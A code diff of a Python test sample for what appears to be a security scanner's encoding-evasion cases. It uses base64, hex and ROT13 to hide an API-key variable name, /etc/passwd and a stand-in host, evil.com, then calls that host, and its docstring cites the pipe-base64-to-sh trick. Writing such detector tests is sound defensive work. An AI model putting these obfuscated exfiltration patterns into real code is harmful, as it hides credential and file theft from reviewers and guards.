@@ -1,31 +1,24 @@
 #!/usr/bin/env python3
 """
 evasion-04-base64-encoded.py — Base64/Hex 编码绕过
-参考: GuardFall Class D (echo base64 | base64 -d | sh)
-     SkillCloak SFS Packing 技术
+参考事件: SkillCloak SFS Packing (arXiv 2607.02357)
+         GuardFall Class D — echo base64 | base64 -d | sh
+严重等级: 严重 (高)
+拦截方式: 尝试解码所有 base64-like 字符串，检查解码后内容
+  base64.b64decode("T1BFTkFJX0FQSV9LRVk=")  → decoded: OPENAI_API_KEY → DENY
+  binascii.unhexlify("6576696c2e636f6d")      → decoded: evil.com → DENY
+  base64.b64decode("L2V0Yy9wYXNzd2Q=")       → decoded: /etc/passwd → DENY
 """
-
 import os, requests, base64, binascii
 
-# Base64 编码字符串
-enc_key = base64.b64decode("T1BFTkFJX0FQSV9LRVk=").decode()  # OPENAI_API_KEY
+enc_key = base64.b64decode("T1BFTkFJX0FQSV9LRVk=").decode()
 os.environ.get(enc_key)
-
-# Hex 编码域名
-enc_host = binascii.unhexlify("6576696c2e636f6d").decode()  # evil.com
+enc_host = binascii.unhexlify("6576696c2e636f6d").decode()
 requests.get(f"https://{enc_host}/collect")
-
-# Base64 编码路径
-enc_path = base64.b64decode("L2V0Yy9wYXNzd2Q=").decode()  # /etc/passwd
+enc_path = base64.b64decode("L2V0Yy9wYXNzd2Q=").decode()
 open(enc_path)
-
-# 双重编码
 dbl = base64.b64decode(base64.b64decode("V0VSQVNGRFNHREZIRA==").decode()).decode()
-# ^ 实际解码后是一个字符串，这里模拟双重编码绕过
 requests.get(f"https://{dbl}.com")
-
-# ROT13 简单替换
-rot13 = str.maketrans(
-    "abcdefghijklmnopqrstuvwxyz", "nopqrstuvwxyzabcdefghijklm")
-target = "rivy.pbz".translate(rot13)  # evil.com
+rot13 = str.maketrans("abcdefghijklmnopqrstuvwxyz", "nopqrstuvwxyzabcdefghijklm")
+target = "rivy.pbz".translate(rot13)
 requests.get(f"https://{target}")
